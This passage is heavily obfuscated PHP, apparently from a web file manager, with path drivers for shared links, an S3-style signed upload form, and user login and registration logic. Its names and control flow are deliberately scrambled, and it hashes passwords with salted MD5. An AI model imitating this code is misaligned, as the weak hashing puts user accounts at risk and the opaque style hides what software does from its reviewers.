$c™Ê”ô¹ÌŸ[1151], $c™Ê”ô¹ÌŸ[113], $c™Ê”ô¹ÌŸ[1152], $c™Ê”ô¹ÌŸ[1153]); if (in_array($Bµ„ã‰á¡, $dôí•æ¹Õè)) { $eùùÆ¦ğ§ä = $this->getPathOuter($eùùÆ¦ğ§ä); } return $eùùÆ¦ğ§ä; } public function copy($b—³×òœ‡­, $AÉ—Öö¶°, $aÆƒïáŞ™• = false) { return $this->copyMove($b—³×òœ‡­, $AÉ—Öö¶°, $aÆƒïáŞ™•, $_SERVER[±á õÁ][515]); } public function move($E›éŒ¸Ûõ, $dê¯ÀÅÑ™, $Cšä‡ìß‹ = false) { return $this->copyMove($E›éŒ¸Ûõ, $dê¯ÀÅÑ™, $Cšä‡ìß‹, $_SERVER[±á õÁ][517]); } private function copyMove($bÁÍíºáÉã, $eë´÷óßÑ, $C²ˆ¹œ…¢Ò, $FİäÇ˜‰Æ†) { goto E·í²ÑÁĞ«; cëæ·ì´©Í: if ($f²¡º¯„Ş•->pathParse[$d½‡“›’ˆõ[1016]]) { $eë´÷óßÑ = $f²¡º¯„Ş•->pathParse[$d½‡“›’ˆõ[1016]]; } else { $eë´÷óßÑ = $f©›½‰Ä±¿; } $dÃÉŠ–Â‰ = IO::copyMove($bÁÍíºáÉã, $eë´÷óßÑ, $C²ˆ¹œ…¢Ò, $FİäÇ˜‰Æ†); $dÃÉŠ–Â‰ = $this->getPathOuter($dÃÉŠ–Â‰); goto FÇ’°½Á‹; E·í²ÑÁĞ«: $d½‡“›’ˆõ =& $_SERVER[±á õÁ]; $f©›½‰Ä±¿ = $eë´÷óßÑ; $f²¡º¯„Ş• = IO::driverMake($eë´÷óßÑ); goto cëæ·ì´©Í; FÇ’°½Á‹: return $dÃÉŠ–Â‰; goto e„…ÊøŞì“; e„…ÊøŞì“: } public function pathFather($EáÂ›Ø¨Ì) { return get_path_father($this->pathParse[$_SERVER[±á õÁ][85]]); } public function iconvSystem($cÑêÔ½”‡) { return $cÑêÔ½”‡; } protected function infoParse($Fƒºõàñ©, $DÅßÑšäÆ = false) { $aá«Ò×Ú÷ =& $_SERVER[±á õÁ]; $CÓÆ„Ï·ù = $this->pathParse[$aá«Ò×Ú÷[462]][$aá«Ò×Ú÷[1041]] . $this->pathParse[$aá«Ò×Ú÷[1034]]; if ($DÅßÑšäÆ) { $E£Í™ó¡Ëª = IO::infoWithChildren($CÓÆ„Ï·ù); } else { $E£Í™ó¡Ëª = IO::info($CÓÆ„Ï·ù); } $CÖë®Ô¡©™ = $this->pathParse[$aá«Ò×Ú÷[462]]; return Action($aá«Ò×Ú÷[1145])->_shareItemeParse($E£Í™ó¡Ëª, $CÖë®Ô¡©™); } public function listAll($e™éŸØ¾å) { $B§Õ†ò£¯ó =& $_SERVER[±á õÁ]; $CÒ¦¥÷¡ = IO::listAll($e™éŸØ¾å); $DµŒ£ÀÓ‡Ü = $this->pathParse[$B§Õ†ò£¯ó[462]]; foreach ($CÒ¦¥÷¡ as &$D…µÕßØø) { check_abort(); $D…µÕßØø = array_merge(IO::info($D…µÕßØø[$B§Õ†ò£¯ó[85]]), $D…µÕßØø); $D…µÕßØø[$B§Õ†ò£¯ó[415]] = Action($B§Õ†ò£¯ó[1145])->_shareItemeParse($D…µÕßØø, $DµŒ£ÀÓ‡Ü); } unset($D…µÕßØø); return $CÒ¦¥÷¡; } public function getPathOuter($fİáŞ•ºŸç) { goto d™—½ÎÈ—‘; a£ïºç¹’: $F­¡Â¦Ïê¿ = KodIO::clear($fİáŞ•ºŸç); $CÈ–©øè—¡ = KodIO::clear($this->pathParse[$cœ Òˆİ™[462]][$cœ Òˆİ™[1041]]); $DÓáÆÕ§ö = substr($F­¡Â¦Ïê¿, strlen($CÈ–©øè—¡)); goto C‘ªæ¼‹®Š; d™—½ÎÈ—‘: $cœ Òˆİ™ =& $_SERVER[±á õÁ]; $e±±¼ÒƒÊÏ = KodIO::parse($fİáŞ•ºŸç); if ($e±±¼ÒƒÊÏ[$cœ Òˆİ™[39]] == KodIO::KOD_SHARE_ITEM) { return $e±±¼ÒƒÊÏ[$cœ Òˆİ™[85]]; } goto a£ïºç¹’; C‘ªæ¼‹®Š: if (substr($F­¡Â¦Ïê¿, 0, strlen($CÈ–©øè—¡)) != $CÈ–©øè—¡) { return !1; } return $this->pathParse[$cœ Òˆİ™[1035]] . $cœ Òˆİ™[8] . ltrim($DÓáÆÕ§ö, $cœ Òˆİ™[8]); goto BŸ§›ÍÒ·Ø; BŸ§›ÍÒ·Ø: } public function getType() { $d¯Š•éÈô =& $_SERVER[±á õÁ]; $BùšáÍ´ = str_replace($d¯Š•éÈô[81], $d¯Š•éÈô[43], get_class($this)); return strtolower($BùšáÍ´); } public function isTypeObject($eô¢ßé»ÕÙ) { return IO::isTypeObject($eô¢ßé»ÕÙ); } public function info($bß—¹ğÛ‹Ü) { return $this->infoParse($bß—¹ğÛ‹Ü); } public function infoAuth($eÔ¥±îè¢Â) { return $this->infoParse($eÔ¥±îè¢Â); } public function infoWithChildren($aãÜ…ˆÙÎÁ) { return $this->infoParse($aãÜ…ˆÙÎÁ, !0); } public function infoFull($C¥ÖšŠ†Ş) { return $this->infoParse($C¥ÖšŠ†Ş); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($bÀğ«òæ‘) { $this->pathParse = $bÀğ«òæ‘; } protected function infoParse($f„×˜³†ƒ’, $b›Å˜¸Çğ… = false) { $c¯ø…ƒñ‰Ô =& $_SERVER[±á õÁ]; return Action($c¯ø…ƒñ‰Ô[1040])->sharePathInfo($this->pathParse[$c¯ø…ƒñ‰Ô[85]], !0, $b›Å˜¸Çğ…); } public function listPath($e“™õ´â, $bä¯ĞÜâÑ¶ = false) { $e¦œğ·„ïç =& $_SERVER[±á õÁ]; $fÖ›äÖ· = IO::listPath($e“™õ´â, $bä¯ĞÜâÑ¶); foreach ($fÖ›äÖ· as $bÃâŞ×›  => $E«‘‘¼ñëù) { if (!in_array($bÃâŞ×› , array($e¦œğ·„ïç[83], $e¦œğ·„ïç[84]))) { continue; } foreach ($E«‘‘¼ñëù as $C¾àÖÎ¨ÀÜ => $d¨“÷âÓ±) { $d¨“÷âÓ± = Action($e¦œğ·„ïç[1154])->parsePathChildren($d¨“÷âÓ±, array($e¦œğ·„ïç[411] => $e“™õ´â)); $fÖ›äÖ·[$bÃâŞ×› ][$C¾àÖÎ¨ÀÜ] = Action($e¦œğ·„ïç[1040])->shareItemInfo($d¨“÷âÓ±); } } return $fÖ›äÖ·; } public function listAll($eÔÇ¸·ÌÇ·) { $cØÖàÏî×‡ =& $_SERVER[±á õÁ]; $Dà›„åÕ‚÷ = IO::listAll($eÔÇ¸·ÌÇ·); foreach ($Dà›„åÕ‚÷ as &$F­¢´Ì§¸) { $F­¢´Ì§¸ = array_merge(IO::info($F­¢´Ì§¸[$cØÖàÏî×‡[85]]), $F­¢´Ì§¸); $F­¢´Ì§¸[$cØÖàÏî×‡[415]] = Action($cØÖàÏî×‡[1040])->shareItemInfo($F­¢´Ì§¸); } unset($F­¢´Ì§¸); return $Dà›„åÕ‚÷; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($b¤‚ –ù¶­) { parent::__construct($b¤‚ –ù¶­); $this->signatureVersion($_SERVER[±á õÁ][218]); } public function uploadFormData($BÑÓæ‹‡²‚, $F¥©öº½œ´ = 3600) { goto AõÇÑÓ´¡Ë; cŒÃİ‰â¡‚: $döá³›°½— = $E·‚Ä¼Ñ³Ê[1157]; $Fõ§²¥±å = $F¥©öº½œ´ . $E·‚Ä¼Ñ³Ê[43]; $B¡‹À‡«Ê = $E·‚Ä¼Ñ³Ê[1121]; goto aÍ¾ĞŸ†Ñ; AõÇÑÓ´¡Ë: $E·‚Ä¼Ñ³Ê =& $_SERVER[±á õÁ]; $B¬¸§šì´† = $E·‚Ä¼Ñ³Ê[199]; $a×Šà«™µ = $E·‚Ä¼Ñ³Ê[1155]; goto d¿“¢İ•Ë¶; aÍ¾ĞŸ†Ñ: $FÄÔ‡áßÇ× = array($this->accessKey, $BÊ›¼µëâ, $this->region, $b¯ˆ‹â­¿¸, $döá³›°½—); $e‹Éí±¾¡» = implode($E·‚Ä¼Ñ³Ê[8], $FÄÔ‡áßÇ×); $DêÂÔİä¥„ = array($E·‚Ä¼Ñ³Ê[1123] => gmdate($E·‚Ä¼Ñ³Ê[1122], strtotime($E·‚Ä¼Ñ³Ê[1158])), $E·‚Ä¼Ñ³Ê[1124] => array(array($E·‚Ä¼Ñ³Ê[1126] => $this->bucket), array($E·‚Ä¼Ñ³Ê[1125] => $B¬¸§šì´†), array($E·‚Ä¼Ñ³Ê[1127], $E·‚Ä¼Ñ³Ê[1128], $E·‚Ä¼Ñ³Ê[43]), array($E·‚Ä¼Ñ³Ê[1127], $E·‚Ä¼Ñ³Ê[1159], $E·‚Ä¼Ñ³Ê[43]), array($E·‚Ä¼Ñ³Ê[1127], $E·‚Ä¼Ñ³Ê[1160], $E·‚Ä¼Ñ³Ê[43]), array($E·‚Ä¼Ñ³Ê[1129] => $B¡‹À‡«Ê), array($E·‚Ä¼Ñ³Ê[1161] => $e‹Éí±¾¡»), array($E·‚Ä¼Ñ³Ê[1162] => $a×Šà«™µ), array($E·‚Ä¼Ñ³Ê[1163] => $EÁ¯£©š¤Œ), array($E·‚Ä¼Ñ³Ê[1164] => $Fõ§²¥±å))); goto eŒİ†–Ç£; E’Ë‚˜´Í: $d†ÃÀ›ÁŠŞ = hash_hmac($E·‚Ä¼Ñ³Ê[1165], $b¯ˆ‹â­¿¸, $FŠ¿ŒŠ«®®, !0); $eé™ËÅ”Â = hash_hmac($E·‚Ä¼Ñ³Ê[1165], $döá³›°½—, $d†ÃÀ›ÁŠŞ, !0); $fÕòÔã°ÄÒ = hash_hmac($E·‚Ä¼Ñ³Ê[1165], $a¢±»´–æ, $eé™ËÅ”Â); goto eÂ˜³ÍŞ¬Á; eÂ˜³ÍŞ¬Á: $B¡êÃ’îİ = array($E·‚Ä¼Ñ³Ê[217] => $E·‚Ä¼Ñ³Ê[43], $E·‚Ä¼Ñ³Ê[1167] => $E·‚Ä¼Ñ³Ê[43], $E·‚Ä¼Ñ³Ê[1125] => $B¬¸§šì´†, $E·‚Ä¼Ñ³Ê[1129] => $B¡‹À‡«Ê, $E·‚Ä¼Ñ³Ê[1133] => $a¢±»´–æ, $E·‚Ä¼Ñ³Ê[1168] => $e‹Éí±¾¡», $E·‚Ä¼Ñ³Ê[1169] => $a×Šà«™µ, $E·‚Ä¼Ñ³Ê[1170] => $EÁ¯£©š¤Œ, $E·‚Ä¼Ñ³Ê[1171] => $Fõ§²¥±å, $E·‚Ä¼Ñ³Ê[1172] => $fÕòÔã°ÄÒ, $E·‚Ä¼Ñ³Ê[183] => $this->getHost()); return $B¡êÃ’îİ; goto B¦¤ˆô²ä; eŒİ†–Ç£: $a¢±»´–æ = base64_encode(json_encode($DêÂÔİä¥„)); $bºö—«ì«¦ = hash_hmac($E·‚Ä¼Ñ³Ê[1165], $BÊ›¼µëâ, $E·‚Ä¼Ñ³Ê[1166] . $this->secret, !0); $FŠ¿ŒŠ«®® = hash_hmac($E·‚Ä¼Ñ³Ê[1165], $this->region, $bºö—«ì«¦, !0); goto E’Ë‚˜´Í; d¿“¢İ•Ë¶: $b¯ˆ‹â­¿¸ = $E·‚Ä¼Ñ³Ê[69]; $EÁ¯£©š¤Œ = gmdate($E·‚Ä¼Ñ³Ê[1156]); $BÊ›¼µëâ = gmdate($E·‚Ä¼Ñ³Ê[715]); goto cŒÃİ‰â¡‚; B¦¤ˆô²ä: } } goto BİÓŸêƒ²ñ; fˆ…†¡ñ£: class UserModel extends ModelBase { protected $tableName = "\165\x73\145\162"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\x61\x6d\x65" => "\165\163\x65\162\137\155\x65\164\141", "\155\x65\x74\141\106\x69\x65\x6c\x64" => "\165\x73\x65\x72\x49\104"); protected $simpleField = "\x75\x73\x65\162\x49\x44\x2c\x6e\x69\x63\x6b\116\x61\155\x65\54\156\141\155\x65\54\141\166\141\164\x61\x72\x2c\163\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($f£äøØõê) { $bÙêôÏ§º± =& $_SERVER[±á õÁ]; $D“¯¶Î‰¦ = $bÙêôÏ§º±[2039]; return array($bÙêôÏ§º±[1692] => array($f£äøØõê[0], $D“¯¶Î‰¦), $bÙêôÏ§º±[1694] => array($f£äøØõê[0], $D“¯¶Î‰¦), $bÙêôÏ§º±[2040] => array($f£äøØõê[0], $D“¯¶Î‰¦)); } protected function getInfo($f§É…‡‘, $Aì½½‘Îºê = false) { $cåÑ’èĞ³Ù = $this->getInfoSimple($f§É…‡‘); if (!is_array($cåÑ’èĞ³Ù)) { return array(); } if ($Aì½½‘Îºê) { return $this->_getInfoApply($cåÑ’èĞ³Ù); } return $this->cacheFunctionGet($_SERVER[±á õÁ][1748], $f§É…‡‘); } protected function getInfoFull($fÂÏÂÔÑ•Ï, $F¡¶¶·À¤ã = false) { $BŞ¦äêÔ° = $this->getInfoSimple($fÂÏÂÔÑ•Ï); if (!is_array($BŞ¦äêÔ°)) { return array(); } if ($F¡¶¶·À¤ã) { return $this->_getInfoApply($BŞ¦äêÔ°, !0); return $this->_getInfoApply($BŞ¦äêÔ°, !0); } return $this->cacheFunctionGet($_SERVER[±á õÁ][2041], $fÂÏÂÔÑ•Ï); } private function _getInfoApply($ašùÁëÙ¢, $AŸÅ‘„Ã‘Ñ = false) { goto bšßÛØÊÙœ; bšßÛØÊÙœ: $d™Ø‘Áœ¼ =& $_SERVER[±á õÁ]; if (!$ašùÁëÙ¢) { return $ašùÁëÙ¢; } $cºì¤äµ½Î = md5($d™Ø‘Áœ¼[2042] . $ašùÁëÙ¢[$d™Ø‘Áœ¼[822]] . $d™Ø‘Áœ¼[2043] . $ašùÁëÙ¢[$d™Ø‘Áœ¼[38]]); goto fôæ˜Üğ Ì; fôæ˜Üğ Ì: $ašùÁëÙ¢ = $this->_listDataApplyItem($ašùÁëÙ¢); $Eˆ„é‚‚‡ = Model($d™Ø‘Áœ¼[1138])->metaGet($ašùÁëÙ¢[$d™Ø‘Áœ¼[415]][$d™Ø‘Áœ¼[393]]); $ašùÁëÙ¢[$d™Ø‘Áœ¼[2044]] = $cºì¤äµ½Î; goto D·Åó›´§Š; D·Åó›´§Š: $ašùÁëÙ¢[$d™Ø‘Áœ¼[415]][$d™Ø‘Áœ¼[1880]] = isset($Eˆ„é‚‚‡[$d™Ø‘Áœ¼[1881]]) ? $Eˆ„é‚‚‡[$d™Ø‘Áœ¼[1881]] : null; if ($AŸÅ‘„Ã‘Ñ) { $ašùÁëÙ¢[$d™Ø‘Áœ¼[441]] = $this->metaGet($ašùÁëÙ¢[$d™Ø‘Áœ¼[1463]]); } return $ašùÁëÙ¢; goto CËğçØÂÆö; CËğçØÂÆö: } protected function getInfoSimple($C”ß¾»‰õñ, $fõªØ»–ê = false) { $E·ééË‚Õ÷ =& $_SERVER[±á õÁ]; if (!$C”ß¾»‰õñ) { return array(); } if ($fõªØ»–ê) { $E„Ä®‘ã²ó = $this->where(array($E·ééË‚Õ÷[1463] => intval($C”ß¾»‰õñ)))->find(); if (!is_array($E„Ä®‘ã²ó)) { return array(); } $E„Ä®‘ã²ó[$E·ééË‚Õ÷[2045]] = Action($E·ééË‚Õ÷[2046])->parseUrl($E„Ä®‘ã²ó[$E·ééË‚Õ÷[2045]]); return $E„Ä®‘ã²ó; } return $this->cacheFunctionGet($E·ééË‚Õ÷[1695], $C”ß¾»‰õñ); } protected function getInfoSimpleOuter($f‘‘Úºäğ“) { goto fÃÕ™ñ‘ì¿; bö‘œƒ‰İ: $b­ÃÂò–™Ù = array_field_key($DÚ›øäÙ‹ , explode($Cİ“µ¥ÓÎë[57], $this->simpleField)); if (!$b­ÃÂò–™Ù) { return array($Cİ“µ¥ÓÎë[1463] => $Cİ“µ¥ÓÎë[1053], $Cİ“µ¥ÓÎë[38] => $Cİ“µ¥ÓÎë[167] . LNG($Cİ“µ¥ÓÎë[2049]) . $Cİ“µ¥ÓÎë[501], $Cİ“µ¥ÓÎë[2045] => STATIC_PATH . $Cİ“µ¥ÓÎë[2050]); } $b­ÃÂò–™Ù[$Cİ“µ¥ÓÎë[2045]] = Action($Cİ“µ¥ÓÎë[2046])->parseUrl($b­ÃÂò–™Ù[$Cİ“µ¥ÓÎë[2045]]); goto B‹»ÁæÑÏæ; fÃÕ™ñ‘ì¿: $Cİ“µ¥ÓÎë =& $_SERVER[±á õÁ]; if (!$f‘‘Úºäğ“ || $f‘‘Úºäğ“ == 0) { return array($Cİ“µ¥ÓÎë[1463] => $Cİ“µ¥ÓÎë[493], $Cİ“µ¥ÓÎë[38] => $Cİ“µ¥ÓÎë[167] . LNG($Cİ“µ¥ÓÎë[2047]) . $Cİ“µ¥ÓÎë[501], $Cİ“µ¥ÓÎë[2045] => STATIC_PATH . $Cİ“µ¥ÓÎë[2048]); } $DÚ›øäÙ‹  = $this->cacheFunctionGet($Cİ“µ¥ÓÎë[1695], $f‘‘Úºäğ“); goto bö‘œƒ‰İ; B‹»ÁæÑÏæ: return $b­ÃÂò–™Ù; goto aªã®—ğöµ; aªã®—ğöµ: } protected function groupUser($d±© ¹Û‹‰) { } public static function errorLang($B†Ùí¸ğ) { $bƒ ’Ã¯ =& $_SERVER[±á õÁ]; $f§¥ÀîäÙŒ = array(self::ERROR_USER_NOT_EXISTS => $bƒ ’Ã¯[2051], self::ERROR_USER_PASSWORD_ERROR => $bƒ ’Ã¯[2052], self::ERROR_USER_EXIST_NAME => $bƒ ’Ã¯[2053], self::ERROR_USER_EXIST_PHONE => $bƒ ’Ã¯[2054], self::ERROR_USER_EXIST_EMAIL => $bƒ ’Ã¯[2055], self::ERROR_USER_LOGIN_LOCK => $bƒ ’Ã¯[2056], self::ERROR_IP_NOT_ALLOW => $bƒ ’Ã¯[2057], self::ERROR_USER_EXIST_NICKNAME => $bƒ ’Ã¯[2058]); return LNG($f§¥ÀîäÙŒ[$B†Ùí¸ğ]); } public function getInfoByMeta($B¦ğ·òŸÎ®, $a­º£ñ„‡İ) { $aÍÛÜ§¢Ó =& $_SERVER[±á õÁ]; $d±Üç‡ºªŸ = Model($aÍÛÜ§¢Ó[2059])->where(array($aÍÛÜ§¢Ó[99] => $B¦ğ·òŸÎ®, $aÍÛÜ§¢Ó[375] => $a­º£ñ„‡İ))->find(); if ($d±Üç‡ºªŸ) { return $this->getInfo($d±Üç‡ºªŸ[$aÍÛÜ§¢Ó[1463]]); } return !1; } public function userLoginCheck($cƒ³Ø‡˜, $EŒÙ…ìèá›) { $A£Íš…Î˜÷ =& $_SERVER[±á õÁ]; $BØÅÔŞßÓ = $this->userLoginFind($cƒ³Ø‡˜); if (!$BØÅÔŞßÓ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($BØÅÔŞßÓ[$A£Íš…Î˜÷[1463]], $EŒÙ…ìèá›)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($BØÅÔŞßÓ[$A£Íš…Î˜÷[1463]]); } public function userLoginFind($F×öôàÔºğ) { $Fù˜˜ß¥š´ =& $_SERVER[±á õÁ]; $bñ®’ˆÆÆß = array($Fù˜˜ß¥š´[38] => $F×öôàÔºğ, $Fù˜˜ß¥š´[1884] => $F×öôàÔºğ, $Fù˜˜ß¥š´[308] => $F×öôàÔºğ, $Fù˜˜ß¥š´[2060] => $F×öôàÔºğ, $Fù˜˜ß¥š´[930] => $Fù˜˜ß¥š´[932]); if ($this->nickNameRpt()) { unset($bñ®’ˆÆÆß[$Fù˜˜ß¥š´[1884]]); } return $this->where($bñ®’ˆÆÆß)->find(); } public function clearCache($B»Œä³‰¨Ë) { $eĞøñ«ßˆÕ =& $_SERVER[±á õÁ]; $this->cacheFunctionClear($eĞøñ«ßˆÕ[1748], $B»Œä³‰¨Ë); $this->cacheFunctionClear($eĞøñ«ßˆÕ[1695], $B»Œä³‰¨Ë); $this->cacheFunctionClear($eĞøñ«ßˆÕ[2041], $B»Œä³‰¨Ë); } public function userPasswordCheck($bùŒƒŒò›§, $fĞêÏ¡îÙÓ) { $DíÅÑ•‚â· =& $_SERVER[±á õÁ]; $CÇÒÍ®°× = $this->where(array($DíÅÑ•‚â·[1463] => intval($bùŒƒŒò›§)))->find(); $C¦ƒİµÚ› = $this->metaGet($bùŒƒŒò›§); $FÚòÚå–Ú = isset($C¦ƒİµÚ›[$DíÅÑ•‚â·[2061]]) ? $C¦ƒİµÚ›[$DíÅÑ•‚â·[2061]] : $DíÅÑ•‚â·[43]; if (md5($FÚòÚå–Ú . trim($fĞêÏ¡îÙÓ)) !== $CÇÒÍ®°×[$DíÅÑ•‚â·[822]]) { return !1; } return !0; } public function userAdd($d‚áƒ•ÛÛÓ) { goto A·¿¸ÔŠ–¼; d®â£Ÿ©¯º: $DøÀ²Š°„ = $this->_checkExist($d‚áƒ•ÛÛÓ); if ($DøÀ²Š°„ !== !0) { return $DøÀ²Š°„; } $D¬ˆéªƒõà = $this->add($céÓ¡‚ğâ°); goto ağ…¼ÍÊàÉ; ağ…¼ÍÊàÉ: $f¯öšÛğù– = array($DÆÉö›ï¦[2069] => $céÓ¡‚ğâ°[$DÆÉö›ï¦[822]], $DÆÉö›ï¦[2065] => $céÓ¡‚ğâ°[$DÆÉö›ï¦[1884]]); $this->userEdit($D¬ˆéªƒõà, $f¯öšÛğù–); Model($DÆÉö›ï¦[1138])->userRootAdd($D¬ˆéªƒõà); goto a ‡Œ‡²¸ç; A·¿¸ÔŠ–¼: $DÆÉö›ï¦ =& $_SERVER[±á õÁ]; $céÓ¡‚ğâ° = array($DÆÉö›ï¦[410] => $d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[38]], $DÆÉö›ï¦[2062] => $d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[1345]], $DÆÉö›ï¦[2063] => isset($d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[308]]) ? $d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[308]] : $DÆÉö›ï¦[43], $DÆÉö›ï¦[2064] => isset($d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[2060]]) ? $d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[2060]] : $DÆÉö›ï¦[43], $DÆÉö›ï¦[2065] => isset($d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[1884]]) ? $d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[1884]] : $d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[38]], $DÆÉö›ï¦[2066] => isset($d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[2045]]) ? $d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[2045]] : $DÆÉö›ï¦[43], $DÆÉö›ï¦[2067] => isset($d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[2068]]) ? $d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[2068]] : 1, $DÆÉö›ï¦[2069] => $d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[822]], $DÆÉö›ï¦[1696] => isset($d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[1605]]) ? $d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[1605]] : 1024 * 1024 * 20, $DÆÉö›ï¦[1697] => 0, $DÆÉö›ï¦[2070] => 0, $DÆÉö›ï¦[1735] => isset($d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[714]]) ? $d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[714]] : 1); if (!empty($d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[1463]])) { $céÓ¡‚ğâ°[$DÆÉö›ï¦[1463]] = $d‚áƒ•ÛÛÓ[$DÆÉö›ï¦[1463]]; } goto d®â£Ÿ©¯º; a ‡Œ‡²¸ç: return $D¬ˆéªƒõà; goto CÏµ½»Ìë; CÏµ½»Ìë: } protected function userEditTest($a¿²¼å”è, $AÂ¿óƒ‡‰) { return $this->call($_SERVER[±á õÁ][2071], $a¿²¼å”è, $AÂ¿óƒ‡‰); } protected function userEdit($eÂÙØ£óçÚ, $DÜÑÕ½…Äá) { goto cã—Ÿ„öµ; AÙ­¿Üæ–Œ: return !0; goto bÅÓ¼æÖ»Ã; cã—Ÿ„öµ: $cš•ÚğƒÅ =& $_SERVER[±á õÁ]; $E—İÕ˜£ï = $this->getInfoSimple($eÂÙØ£óçÚ); if (!$E—İÕ˜£ï) { return !1; } goto d«­ªÅ¢¡‘; d¨‰®èêê: $this->where(array($cš•ÚğƒÅ[1455] => $eÂÙØ£óçÚ))->save($DÜÑÕ½…Äá); if (isset($DÜÑÕ½…Äá[$cš•ÚğƒÅ[1884]])) { $this->setNamePinyin($eÂÙØ£óçÚ, $DÜÑÕ½…Äá[$cš•ÚğƒÅ[1884]]); } $this->clearCache($eÂÙØ£óçÚ); goto AÙ­¿Üæ–Œ; d«­ªÅ¢¡‘: $e¶íÅ½¯Åè = $this->_checkExist($DÜÑÕ½…Äá, $eÂÙØ£óçÚ); if ($e¶íÅ½¯Åè !== !0) { return $e¶íÅ½¯Åè; } if (isset($DÜÑÕ½…Äá[$cš•ÚğƒÅ[822]]) && trim($DÜÑÕ½…Äá[$cš•ÚğƒÅ[822]]) != $cš•ÚğƒÅ[43]) { $dÎÄ‚‚­¬¶ = $this->metaGet($eÂÙØ£óçÚ); if (empty($dÎÄ‚‚­¬¶[$cš•ÚğƒÅ[2061]])) { $dÎÄ‚‚­¬¶[$cš•ÚğƒÅ[2061]] = rand_string(10); Model($cš•ÚğƒÅ[499])->metaSet($eÂÙØ£óçÚ, $cš•ÚğƒÅ[2061], $dÎÄ‚‚­¬¶[$cš•ÚğƒÅ[2061]]); } $DÜÑÕ½…Äá[$cš•ÚğƒÅ[822]] = md5($dÎÄ‚‚­¬¶[$cš•ÚğƒÅ[2061]] . trim($DÜÑÕ½…Äá[$cš•ÚğƒÅ[822]])); } else { unset($DÜÑÕ½…Äá[$cš•ÚğƒÅ[822]]); } goto d¨‰®èêê; bÅÓ¼æÖ»Ã: } public function setNamePinyin($b‡ˆßË³ß¡, $C“•İÉ¤Ë´ = false) { $a¢„ˆŸÃÖŒ =& $_SERVER[±á õÁ]; if (!$C“•İÉ¤Ë´) { $D®×¢¯º = $this->getInfoSimple($b‡ˆßË³ß¡); $C“•İÉ¤Ë´ = $D®×¢¯º[$a¢„ˆŸÃÖŒ[1884]] ? $D®×¢¯º[$a¢„ˆŸÃÖŒ[1884]] : $D®×¢¯º[$a¢„ˆŸÃÖŒ[38]]; } $Eê¶Ø¡‘± = Model($a¢„ˆŸÃÖŒ[502]); if (!Input::check($C“•İÉ¤Ë´, $a¢„ˆŸÃÖŒ[553])) { return $Eê¶Ø¡‘±->metaSet($b‡ˆßË³ß¡, array($a¢„ˆŸÃÖŒ[440] => $a¢„ˆŸÃÖŒ[43], $a¢„ˆŸÃÖŒ[439] => $a¢„ˆŸÃÖŒ[43])); } return $Eê¶Ø¡‘±->metaSet($b‡ˆßË³ß¡, array($a¢„ˆŸÃÖŒ[440] => str_replace($a¢„ˆŸÃÖŒ[60], $a¢„ˆŸÃÖŒ[43], Pinyin::encode($C“•İÉ¤Ë´)), $a¢„ˆŸÃÖŒ[439] => Pinyin::encode($C“•İÉ¤Ë´, $a¢„ˆŸÃÖŒ[554]))); } private function nickNameRpt() { $b«±ÛáÍ¦‘ =& $_SERVER[±á õÁ]; $D¾…ïòóÉá = Model($b«±ÛáÍ¦‘[1109])->get($b«±ÛáÍ¦‘[2072]); $CøÂš¿·¡¿ = $GLOBALS[$b«±ÛáÍ¦‘[6]][$b«±ÛáÍ¦‘[379]][$b«±ÛáÍ¦‘[2072]]; $bØ˜‚ó‰è» = !is_null($D¾…ïòóÉá) ? $D¾…ïòóÉá : $CøÂš¿·¡¿; return !!$bØ˜‚ó‰è»; } private function _checkExist($c¯ù„·Œªâ, $F¸Ï•ò¼ = false) { $e„æ½¥ßà¼ =& $_SERVER[±á õÁ]; $F¥¶‹ÅóÂ = array($e„æ½¥ßà¼[38] => UserModel::ERROR_USER_EXIST_NAME, $e„æ½¥ßà¼[1884] => UserModel::ERROR_USER_EXIST_NICKNAME, $e„æ½¥ßà¼[308] => UserModel::ERROR_USER_EXIST_EMAIL, $e„æ½¥ßà¼[2060] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($F¥¶‹ÅóÂ[$e„æ½¥ßà¼[1884]]); } $Fôİƒ›Ï¦ = $F¸Ï•ò¼ ? array($e„æ½¥ßà¼[1463] => array($e„æ½¥ßà¼[2073], $F¸Ï•ò¼)) : array(); foreach ($F¥¶‹ÅóÂ as $Cõ¬îËŠÎô => $f®‰ããŠ—) { $BäˆÛ††ÙÅ = array(); foreach ($F¥¶‹ÅóÂ as $eššŞ˜¢ªµ => $dÕ±œ°î‚) { if (isset($c¯ù„·Œªâ[$eššŞ˜¢ªµ]) && $c¯ù„·Œªâ[$eššŞ˜¢ªµ]) { $BäˆÛ††ÙÅ[] = $c¯ù„·Œªâ[$eššŞ˜¢ªµ]; } } if (!$BäˆÛ††ÙÅ) { continue; } $dÏö·ÁŸ¥ª = array_merge(array($Cõ¬îËŠÎô => array($e„æ½¥ßà¼[7], $BäˆÛ††ÙÅ)), $Fôİƒ›Ï¦); 